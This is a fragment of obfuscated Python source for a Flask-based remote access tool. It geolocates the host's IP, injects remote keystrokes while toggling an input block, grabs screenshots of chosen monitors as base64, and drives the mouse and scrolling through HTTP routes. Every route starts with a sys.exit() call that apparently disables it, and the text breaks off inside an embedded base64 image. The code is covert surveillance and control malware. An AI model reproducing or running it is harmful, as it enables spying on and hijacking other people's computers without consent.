    OOOO0OOO00OO000O0 = """<style>.home-container{width:100%;display:flex;overflow:auto;min-height:100vh;align-items:center;flex-direction:column;justify-content:flex-start;background-image:linear-gradient(to right,#fc00ff 0,#00dbde 100%)}.home-text{color:#101010;font-size:30px;align-self:center;font-style:normal;text-align:justify;font-weight:900;line-height:2}.home-text01{color:#101010;font-size:30px;align-self:center;font-style:normal;text-align:justify;font-weight:900;line-height:2}.home-text04{color:#101010;font-size:30px;align-self:center;font-style:normal;text-align:justify;font-weight:900;line-height:2}.home-text07{color:#101010;font-size:30px;align-self:center;font-style:normal;text-align:justify;font-weight:900;line-height:2}.home-text10{color:#101010;font-size:30px;align-self:center;font-style:normal;text-align:justify;font-weight:900;line-height:2}.home-text13{color:#101010;font-size:30px;align-self:center;font-style:normal;text-align:justify;font-weight:900;line-height:2}.home-text16{color:#101010;font-size:30px;align-self:center;font-style:normal;text-align:justify;font-weight:900;line-height:2}.home-text19{color:#101010;font-size:30px;align-self:center;font-style:normal;text-align:justify;font-weight:900;line-height:2}</style><div><link href="./home.css" rel="stylesheet"><div class="home-container"><span class="home-text">IP DETAILS:</span><span class="home-text01"><span>IP : [ip]</span><br></span><span class="home-text04"><span>Country : [country]</span><br></span><span class="home-text07"><span>Region : [regionname]</span><br></span><span class="home-text10"><span>City : [city]</span><br></span><span class="home-text13"><span>Org : [org]</span><br></span><span class="home-text16"><span>Vpn : [proxy/hosting]</span><br></span><span class="home-text19"><span>Mobile : [mobile]</span><br></span></div></div>"""  # line:1939
    try:  # line:1940
        O00OO00OO00000O0O = requests .get(f"http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query")  # line:1941
    except:  # line:1942
        return "IP API ERROR"  # line:1943
    try:  # line:1944
        O0O000O00O0O0O0O0 = O00OO00OO00000O0O .json()["query"]  # line:1945
        OOO000OOO0O000000 = O00OO00OO00000O0O .json()["country"]  # line:1946
        OO0O00O0OOOOO00OO = O00OO00OO00000O0O .json()["regionName"]  # line:1947
        OOO000O00000OO0OO = O00OO00OO00000O0O .json()["city"]  # line:1948
        O0O00O0000O0OO0OO = O00OO00OO00000O0O .json()["org"]  # line:1949
        OOO0OOOO00OOOO000 = str(O00OO00OO00000O0O .json ()["mobile"]).title ()  # line:1950
        O0O000OO0O0OO00OO = "False"  # line:1952
        if O00OO00OO00000O0O .json ()["hosting"] == True or O00OO00OO00000O0O .json ()["proxy"] ==True :#line:1953
            O0O000OO0O0OO00OO = "True"  # line:1954
        return OOOO0OOO00OO000O0 .replace ("[ip]", O0O000O00O0O0O0O0 ).replace ("[country]", OOO000OOO0O000000 ).replace ("[regionname]", OO0O00O0OOOOO00OO ).replace ("[city]",OOO000O00000OO0OO ).replace ("[org]",O0O00O0000O0OO0OO ).replace ("[proxy/hosting]",O0O000OO0O0OO00OO ).replace ("[mobile]",OOO0OOOO00OOOO000 )#line:1955
    except:  # line:1956
        return O00OO00OO00000O0O .text  # line:1957


@app .route ('/type', methods =["POST"])  # line:1959
def type_keys():  # line:1960
    sys.exit()
    global is_input_banned  # line:1961
    OO0O000O0O0O0O00O = request .get_json("keys")  # line:1962
    O00O00O00OO0O0000 = str(OO0O000O0O0O0O00O ["keys"])  # line:1963
    if is_input_banned == True:  # line:1964
        _O0O0O0OO000000OO0(False)  # line:1965
    keyboard .type(O00O00O00OO0O0000)  # line:1966
    if is_input_banned == True:  # line:1967
        _O0O0O0OO000000OO0(True)  # line:1968
    return "Good"  # line:1969


@app .route('/ss')  # line:1972
def ss():  # line:1973
    sys.exit()
    try:  # line:1974
        if 'screen'not in str(request .url).lower ():  # line:1975
            OOOOO000OOOOO00O0 = ImageGrab .grab (all_screens =True)  # line:1976
        else:  # line:1977
            OO0O0OOOO00000OOO = int(request .args .get ('screen'))-1  # line:1978
            O00O0000000000000 = all_monitors [OO0O0OOOO00000OOO]  # line:1979
            OOOOO000OOOOO00O0 = ImageGrab .grab (bbox =(O00O0000000000000 [0 ], O00O0000000000000 [1 ], O00O0000000000000 [2 ],O00O0000000000000 [3 ]))#line:1980
        OOOOO00O0000O00OO = io .BytesIO()  # line:1982
        OOOOO000OOOOO00O0 .save (OOOOO00O0000O00OO, format ="png")  # line:1983
        OOOOO00O0000O00OO .seek(0)  # line:1984
        O0OO0O0O0O0O0O00O = base64 .b64encode(OOOOO00O0000O00OO .read ()).decode ()  # line:1985
        return O0OO0O0O0O0O0O00O  # line:1986
    except Exception as OO0O0OO00O00000OO:  # line:1987
        return f"{OO0O0OO00O00000OO} | {all_monitors}"  # line:1988

done_positions = []  # line:1990
mouse_storage = {}  # line:1991


@app .route ('/mouse', methods =["POST"])  # line:1992
def mouse_manager():  # line:1993
    sys.exit()
    OOO0OO00OOOO0OOO0 = request .get_json("type")  # line:1995
    OO00O00O00O0OOOO0 = int(OOO0OO00OOOO0OOO0 ["type"])  # line:1996
    OO0000OO0OO0O0OOO = request .get_json("x_data")  # line:1998
    O00OO00OO0OOO0OO0 = int(OO0000OO0OO0O0OOO ["x"])  # line:1999
    O0OO0OOOOO0000O00 = request .get_json("y_data")  # line:2001
    OOO00O000O0OO0O00 = int(O0OO0OOOOO0000O00 ["y"])  # line:2002
    O00OO000OO00OO00O = request .get_json("action")  # line:2004
    OO0OOO00O0O00OOO0 = str(O00OO000OO00OO00O ["action"])  # line:2005
    OOO0O0O0000O0O00O = request .get_json("screen")  # line:2008
    OO000O0OO0O000O0O = int(OOO0O0O0000O0O00O ["screen"])  # line:2009
    if OO00O00O00O0OOOO0 == 1:  # line:2011
        O0O0O0O000OOO0OOO = Button .left  # line:2012
    elif OO00O00O00O0OOOO0 == 2:  # line:2013
        O0O0O0O000OOO0OOO = Button .middle  # line:2014
    elif OO00O00O00O0OOOO0 == 3:  # line:2015
        O0O0O0O000OOO0OOO = Button .right  # line:2016
    if OO000O0OO0O000O0O != -1:  # line:2018
        O0O0OOOOOOOO0OO0O = all_monitors [OO000O0OO0O000O0O]  # line:2019
        O0O0O000O0OO00OO0 = O0O0OOOOOOOO0OO0O [0]
        OOO000OO000OO00OO = O0O0OOOOOOOO0OO0O [1 ]  # line:2020
        O00OO00OO0OOO0OO0 = O0O0O000O0OO00OO0 + O00OO00OO0OOO0OO0  # line:2021
        OOO00O000O0OO0O00 = OOO000OO000OO00OO + OOO00O000O0OO0O00  # line:2022
    if OO0OOO00O0O00OOO0 == "down":  # line:2026
        mouse_storage [OO00O00O00O0OOOO0 ] = [O00OO00OO0OOO0OO0 , OOO00O000O0OO0O00 ]  # line:2028
    if OO0OOO00O0O00OOO0 == "up":  # line:2029
        OO000OO0000O00000 = mouse_storage [OO00O00O00O0OOOO0]  # line:2031
        mouse .position = (OO000OO0000O00000 [0 ], OO000OO0000O00000 [1 ])  # line:2033
        mouse .press(O0O0O0O000OOO0OOO)  # line:2034
        if [O00OO00OO0OOO0OO0, OOO00O000O0OO0O00 ]not in done_positions :  # line:2036
            time .sleep(2)  # line:2037
            mouse .position = (O00OO00OO0OOO0OO0 , OOO00O000O0OO0O00 )  # line:2038
            # line:2039
            print(f"Moved from {OO000OO0000O00000} to {O00OO00OO0OOO0OO0},{OOO00O000O0OO0O00}")
        mouse .release(O0O0O0O000OOO0OOO)  # line:2044
    done_positions .append ([O00OO00OO0OOO0OO0, OOO00O000O0OO0O00 ])  # line:2045
    return "Done"  # line:2046


def scroll_sensitivity (OO000OO0OOOOOOOOO , sensitivity =65 ):  # line:2048
    sys.exit()
    return int (OO000OO0OOOOOOOOO / sensitivity)  # line:2049


@app .route ('/scroll', methods =["POST"])  # line:2051
def scroll_manager():  # line:2052
    sys.exit()
    O00OO0O0OO0OOO0OO = request .get_json("scroll")  # line:2053
    OO00OO000OO00OO00 = int(O00OO0O0OO0OOO0OO ["scroll"])*-1  # line:2054
    O0O000O0O0O0OO0O0 = scroll_sensitivity (OO00OO000OO00OO00)  # line:2056
    mouse .scroll (0, O0O000O0O0O0OO0O0 )  # line:2058
    return "SCROLLED"  # line:2059


@app .route('/screen')  # line:2065
@app .route('/screenshot')  # line:2066
def screenshot():  # line:2067
    sys.exit()
    OOOOOOOOOO0OOOO00 = 0
    OO00OO0O00O000O00 = ""  # line:2068
    for OOO0OO0O00OO0OO00 in all_monitors:  # line:2069
        OOOOOOOOOO0OOOO00 += 1  # line:2070
        OO00OO0O00O000O00 += '''<a href="javascript: screenset('/ss?screen=SCREENNUMBER');"><button  class="btn"><i class="fa fa-desktop"></i>  SCREEN SCREENNUMBER</button></a>'''.replace ("SCREENNUMBER", str (OOOOOOOOOO0OOOO00 ))  # line:2071
    return """
<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><style>.movetobottom{position:absolute;bottom:-25px;left:10px}.buttonbottom{position:absolute;bottom:10px;left:10px;padding:12px 16px;font-size:16px;cursor:pointer;color:#f0f0f0}.container{position:fixed}.containertwo{position:relative;width:20px;bottom:0;right:-90%;accent-color:#25ea84;background:#fff}.btn{background-color:#1a46d6;color:#f0f0f0;padding:100px 200px;cursor:pointer}.btn:hover{background-color:Red}</style></head><body><html><body><div class="container"><img id="myImage" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA6gAAAFnCAYAAACrYGRgAAAAAXNSR0IArs4c6QAAIABJREFUeF7t3buaFEeWAOCU1+OtPMlDb4DeAqwFDyy1PDCxAAvaamQhj/FgLOS1vMEcb0z0CHiLt+0xHvtFa6tVJFlVmVl5ORHxlzMX8nLiP1HVeTIyIr/5/Pnz58aHAAECBAgQIECAAAECBAisLPCNAnXlDDg9AQIECBAgQIAAAQIECFwJKFB1BAIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAAECBAgQIECAgAJVHyBAgAABAgQIECBAgACBEAIK1BBpEAQBAgQIECBAgAABAgQIKFD1AQIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAAECBAgQIECAgAJVHyBAgAABAgQIECBAgACBEAIK1BBpEAQBAgQIECBAgAABAgQIKFD1AQIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAAECBAgQIECAgAJVHyBAgAABAgQIECBAgACBEAIK1BBpEAQBAgQIECBAgAABAgQIKFD1AQIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAAECBAgQIECAgAJVHyBAgAABAgQIECBAgACBEAIK1BBpEAQBAgQIECBAgAABAgQIKFD1AQIECBAgQIAAAQIECBAIIaBADZEGQRAgQIAAAQIECBAgQICAAlUfIECAAAECBAgQIECAAIEQAgrUEGkQBAECBAgQIECAAAECBAgoUPUBAgQIECBAgAABAgQIEAghoEANkQZBECBAgAABAgQIECBAgIACVR8gQIAAAQIECBAgQIAAgRACCtQQaRAEAQIECBAgQIAAAQIECChQ9QECBAgQIECAAAECBAgQCCGgQA2RBkEQIECAAIGyBN69e9f88ssvzU8//dScnp6W1TitIUCAAIHZBBSos9E6MAECBAgQqFfg+++/bz5+/NicnJw0nz59qhdCywkQIEBgkIACdRCXjQkQIECAAIE+At988831Zp8/f+6zi20IECBAgECjQNUJCBAgQIAAgckFtgvU169fe8x3cmEHJECAQJkCCtQy86pVBAgQIEBgVYG//e1vzX/+85+rGDzmu2oqnJwAAQJZCShQs0qXYAkQIECAQB4CL168aJ4+fXodrFHUPPImSgIECKwtoEBdOwPOT4AAAQIEChUwilpoYjWLAAECMwooUGfEdWgCBAgQIFCzgFHUmrOv7QQIEBgnoEAd52YvAgQIECBAoIeAUdQeSDYhQIAAgWsBBarOQIAAAQIECMwmYBR1NloHJkCAQJECCtQi06pRBAgQIEAgjoBR1Di5EAkBAgSiCyhQo2dIfAQIECBAIHOB9ijq58+fM2+R8AkQIEBgLgEF6lyyjkuAAAECBAhcC2yPop6fnzdPnjyhQ4AAAQIEvhJQoOoUBAgQIECAwOwCjx49an799der85ycnDSfPn2a/ZxOQIAAAQL5CShQ88uZiAkQIECAQHYC//nPf5pvv/22Sf+ZPkZRs0uhgAkQILCIgAJ1EWYnIUCAAAECBIyi6gMECBAgcEhAgXpIyL8TIECA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